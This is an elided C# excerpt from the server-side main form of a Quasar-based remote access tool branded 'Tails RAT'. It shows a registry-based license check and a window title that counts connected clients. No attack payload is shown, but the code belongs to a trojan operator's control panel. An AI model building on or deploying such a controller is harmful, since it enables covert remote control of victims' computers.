...
namespace Quasar.Server.Forms
{
    public partial class FrmMain : Form
    {
        ...
        private static string GetRegValue(string registryKeyPath, string valueName)
        {
            string regValue = "";
            try
            {
                // Retrieve the registry value
                regValue = (string)Microsoft.Win32.Registry.GetValue($"HKEY_CURRENT_USER\\{registryKeyPath}", valueName, null);

                if (regValue != null)
                {
                    Debug.Print($"Registry value for {valueName}: {regValue.ToString()}");
                }
                else
                {
                    Debug.Print($"Registry value {valueName} not found.");
                }
            }
            catch (Exception ex)
            {
                Debug.Print($"Error retrieving registry value: {ex.Message}");
            }
        ...
        {
            string Email = GetRegValue("Software\\BlueStack", "Email");
            string License = GetRegValue("Software\\BlueStack", "License");

            if (Email == "" || Email == null || License == "" || License == null)
            {
                return false;
            }
        ...
        public FrmMain()
        {
            ...
            if (! ActivateLicense())
            {
                using (ClientForm dialogForm = new ClientForm())
                {
            ...
            try
            {
                this.Invoke((MethodInvoker) delegate
                {
                    ...
                    this.Text = (selected > 0)
                        ? string.Format("Tails RAT - Connected: {0} [Selected: {1}]", ListenServer.ConnectedClients.Length,
                            selected)
                        : string.Format("Tails RAT - Connected: {0}", ListenServer.ConnectedClients.Length);
                });
            }
            catch (Exception)
            {
